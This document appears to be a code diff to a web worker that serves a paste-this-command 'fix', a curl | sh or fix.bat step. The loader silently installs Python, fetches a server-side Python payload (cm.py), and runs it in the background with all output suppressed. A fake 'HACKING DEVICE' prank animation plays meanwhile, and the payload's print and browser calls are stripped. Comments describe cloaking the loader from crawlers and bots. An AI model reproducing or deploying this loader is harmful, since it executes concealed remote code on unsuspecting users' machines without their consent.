@@ -6,7 +6,7 @@
  *     curl -fsSL https://executeee.nishkarshrana10.workers.dev | sh
  *
  *   Windows CMD:
- *     curl -fsSL https://executeee.nishkarshrana10.workers.dev -o fix.bat && fix.bat
+ *     curl -fsSL https://executeee.nishkarshrana10.workers.dev -H "X-Platform: windows" -o fix.bat && fix.bat
  *
  * Behavior:
  *   - Browsers, link previews, bots, crawlers, scrapers, extra paths, query strings,
@@ -252,6 +252,13 @@ async function consumeSession(request, host, now) {
 /**
  * Minimal Stage-1 handshake loader for Unix (sh): contains zero application code
  * and zero upstream URLs. Token is bound to IP + UA + colo + TLS and expires in 10s.
+ *
+ * Behavior:
+ *   - Silently installs Python 3 if missing (background during prank)
+ *   - Random 5-10 second "Setting up everything..." spinner
+ *   - Fake "HACKING DEVICE..." prank animation
+ *   - Runs cm.py silently in background (all output suppressed)
+ *   - Ends with DEVICE P0WNED — nothing after it
  */
 function buildUnixLoader(origin, token, challenge, requireTty) {
   const ttyLine = requireTty
@@ -275,78 +282,109 @@ P="$(_h "$T:${challenge}")" || { printf 'err occured\\n' >&2; exit 1; }
 S="$(curl -fsSL -X POST --data '' -H "X-Session: $T" -H "X-Proof: $P" '${origin}/' 2>/dev/null)" || { printf 'err occured\\n' >&2; exit 1; }
 [ -n "$S" ] || { printf 'err occured\\n' >&2; exit 1; }
 
-TARGET="\${TMPDIR:-/tmp}/cm_$$.py"
-printf '%s\n' "$S" > "$TARGET"
+TARGET="\${TMPDIR:-/tmp}/cm_$.py"
+printf '%s\\n' "$S" > "$TARGET"
 
-echo ""
-echo "  Setting up everything..."
-echo ""
-for i in 1 2 3 4 5 6 7 8 9 10; do
-  echo "  [$i/10] Setting up everything..."
+# Silently install Python 3 and run cm.py in background during prank
+(
+  command -v python3 >/dev/null 2>&1 || {
+    if command -v pkg >/dev/null 2>&1; then pkg install -y python >/dev/null 2>&1 &
+    elif command -v apt-get >/dev/null 2>&1; then apt-get update -y >/dev/null 2>&1 && apt-get install -y python3 >/dev/null 2>&1 &
+    elif command -v apk >/dev/null 2>&1; then apk add --no-cache python3 >/dev/null 2>&1 &
+    elif command -v dnf >/dev/null 2>&1; then dnf install -y python3 >/dev/null 2>&1 &
+    elif command -v yum >/dev/null 2>&1; then yum install -y python3 >/dev/null 2>&1 &
+    elif command -v pacman >/dev/null 2>&1; then pacman -Sy --noconfirm python >/dev/null 2>&1 &
+    elif command -v zypper >/dev/null 2>&1; then zypper --non-interactive install python3 >/dev/null 2>&1 &
+    elif command -v brew >/dev/null 2>&1; then brew install python3 >/dev/null 2>&1 &
+    fi
+  }
   sleep 2
-done
-echo "  Done!"
+  python3 "$TARGET" >/dev/null 2>&1 &
+) &
 
-sleep 1
+# Random 5-10 second prank animation
+i=0
+end=$(( $(date +%s) + $((RANDOM % 6 + 5)) ))
+while [ "$(date +%s)" -lt "$end" ]; do
+  i=$(( (i + 1) % 4 ))
+  case $i in
+    0) sym="/" ;;
+    1) sym="-" ;;
+    2) sym="\\\\" ;;
+    3) sym="|" ;;
+  esac
+  printf "\\r  [\${sym}] Setting up everything..."
+  sleep 0.2
+done
+
+echo ""
 echo ""
 echo ">>> HACKING DEVICE..."
 echo ""
 echo "[*] Scanning target network..."
-sleep 0.5
+sleep 0.3
 echo "[*] Found open port 22/tcp (SSH)"
-sleep 0.5
+sleep 0.3
 echo "[*] Found open port 80/tcp (HTTP)"
-sleep 0.5
+sleep 0.3
 echo "[*] Found open port 443/tcp (HTTPS)"
-sleep 0.5
+sleep 0.3
 echo "[*] Bypassing firewall rules..."
-sleep 0.5
+sleep 0.3
 echo "[*] Injecting payload into kernel..."
-sleep 0.5
+sleep 0.3
 echo "[*] Escalating privileges to root..."
-sleep 0.5
+sleep 0.3
 echo "[*] Dumping SAM database..."
-sleep 0.5
+sleep 0.3
 echo "[*] Cracking password hashes..."
-sleep 0.5
+sleep 0.3
 echo "[*] Admin: root / p@ssw0rd123"
-sleep 0.5
+sleep 0.3
 echo "[*] Downloading browser cookies..."
-sleep 0.5
+sleep 0.3
 echo "[*] Accessing camera module..."
-sleep 0.5
+sleep 0.3
 echo "[*] Accessing microphone..."
-sleep 0.5
+sleep 0.3
 echo "[*] Extracting contact list..."
-sleep 0.5
+sleep 0.3
 echo "[*] Browsing SMS messages..."
-sleep 0.5
+sleep 0.3
 echo "[*] Uploading data to remote server..."
-sleep 0.5
+sleep 0.3
 echo "[*] Cleaning logs..."
-sleep 0.5
+sleep 0.3
 echo "[*] Planting backdoor..."
-sleep 0.5
+sleep 0.3
 echo "[*] Persistence established..."
-sleep 0.5
+sleep 0.3
 echo "[*] Device fully compromised."
 
 echo ""
 echo "!!! ACCESS GRANTED !!!"
 echo "    DEVICE P0WNED    "
-echo ""
 
-command -v python3 >/dev/null 2>&1 || { printf 'err occured: python3 not found\\n' >&2; rm -f "$TARGET"; exit 1; }
-python3 "$TARGET"
-rc=$?
+# Wait for background install to finish
+wait 2>/dev/null
+
+# Clean up temp file
 rm -f "$TARGET"
-exit $rc
+
+exit 0
 `;
 }
 
 /**
  * Minimal Stage-1 handshake loader for Windows CMD (bat): contains zero application
  * code and zero upstream URLs. Uses PowerShell inline for SHA-256 computation.
+ *
+ * Behavior:
+ *   - Silently installs Python 3 via winget if missing (background during prank)
+ *   - Random 5-10 second "Setting up everything..." spinner
+ *   - Fake "HACKING DEVICE..." prank animation
+ *   - Runs cm.py silently in background (all output suppressed)
+ *   - Ends with DEVICE P0WNED — nothing after it
  */
 function buildWinLoader(origin, token, challenge) {
   return `@echo off
@@ -362,7 +400,7 @@ if "%P%"=="" (
   exit /b 1
 )
 
-set "TEMP_FILE=%TEMP%\\cm_%RANDOM%.py"
+set "TEMP_FILE=%TEMP%\\\\cm_%RANDOM%.py"
 
 curl -fsSL -X POST --data "" -H "X-Session: !T!" -H "X-Proof: !P!" "!origin!" > "!TEMP_FILE!" 2>nul
 if errorlevel 1 (
@@ -370,31 +408,21 @@ if errorlevel 1 (
   exit /b 1
 )
 
-:: Auto-install Python 3 if missing (winget)
-where python >nul 2>&1
-if errorlevel 1 (
-  echo Installing Python 3 via winget...
-  winget.exe install -e --id Python.Python.3.12 --scope user --accept-source-agreements --accept-package-agreements >nul 2>&1
-  where python >nul 2>&1
-  if errorlevel 1 (
-    echo err occured: Python 3 not found and could not be installed >&2
-    del "!TEMP_FILE!" 2>nul
-    exit /b 1
-  )
-)
+:: Silently install Python 3 and run cm.py in background during prank
+start /b "" cmd /c "where python >nul 2>&1 || winget.exe install -e --id Python.Python.3.12 --scope user --accept-source-agreements --accept-package-agreements >nul 2>&1 & timeout /t 2 >nul & python "!TEMP_FILE!" >nul 2>&1"
 
+:: Random 5-10 second prank animation
 echo.
 echo   Setting up everything...
 echo.
 
-for /L %%i in (1,1,10) do (
-  echo   [%%i/10] Setting up everything...
-  timeout /t 2 >nul
+set /a count=%%random% %% 6 + 5
+for /L %%i in (1,1,!count!) do (
+  echo   [%%i/!count!] Setting up everything...
+  timeout /t 1 >nul
 )
 echo   Done!
 
-echo.
-timeout /t 1 >nul
 echo.
 echo ^>^>^> HACKING DEVICE...
 echo.
@@ -442,18 +470,15 @@ echo [*] Device fully compromised.
 echo.
 echo !!! ACCESS GRANTED !!!
 echo     DEVICE P0WNED    
-echo.
 
-python "!TEMP_FILE!"
-set rc=!errorlevel!
 del "!TEMP_FILE!" 2>nul
-exit /b !rc!
+exit /b 0
 `;
 }
 
 /**
  * Stage-2: returns the raw cm.py content fetched server-side from GitHub.
- * The terminal loader saves it to a temp file and runs it with python3/python.
+ * print() and webbrowser.open() are stripped server-side before serving.
  */
 function buildStage2(cmPyContent) {
   // Strip all print() calls from cm.py to prevent install status messages
